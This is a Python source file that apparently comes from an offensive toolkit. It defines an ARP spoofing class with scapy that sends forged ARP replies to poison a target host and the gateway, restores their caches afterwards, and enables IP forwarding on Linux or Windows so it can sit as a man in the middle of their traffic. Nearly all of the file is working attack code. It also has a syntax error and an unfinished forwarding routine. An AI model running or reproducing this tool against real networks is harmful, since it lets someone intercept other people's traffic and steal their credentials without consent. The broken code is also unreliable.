from scapy.all import Ether, ARP, srp, send
import time
import os

service = 0
if os.name == "nt":
    from services import WService
    service = WService("RemoteAccess")
class ARP_Spoofer:
    def __init__(self):
        self.options = {"target_ip":"", "server_ip":"192.168.1.1", "forward_packets":"yes", "verbose":"no"}
        self.macs = ["", ""]
    def get_mac(self, ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
    def spoof(self):
        arp_res = ARP(pdst=self.options["target_ip"], hwdst=self.macs[0], psrc=self.options["server_ip"], op='is-at')
        send(arp_res, verbose=0)
        if self.options["verbose"] == "yes":
            print("[+] Sent to {} : {} is at {}".format(self.options["target_ip"], self.options["server_ip"], ARP().hwsrc))
        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], op='is-at')
        send(arp_res, verbose=0)
        if self.options["verbose"] == "yes":
            print("[+] Sent to {} : {} is at {}".format(self.options["server_ip"], self.options["target_ip"], ARP().hwsrc))

    def restore(self):
        arp_res = ARP(pdst=self.options["target_ip"], hwdst=self.macs[0], psrc=self.options["server_ip"], hwsrc=self.macs[1])
        send(arp_res, verbose=0, count=7)
        if self.options["verbose"] == "yes":
            print("Restoring...")
        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], hwsrc=self.macs[0])
        send(arp_res, verbose=0, count=7)

    def start_spoofing(self):
        if self.options["forward_packets"] == "yes":
            # We need to enable port forwarding
            if os.name == "nt":
                service.start()
            else:
                with open("/proc/sys/net/ipv4/ip_forward", 'w') as f:
                    print(1, file=f)
        else:
            if os.name == "nt"
                service.stop()
            else:
                with open("/proc/sys/net/ipv4/ip_forward", 'w') as f:
                    print(0, file=f)

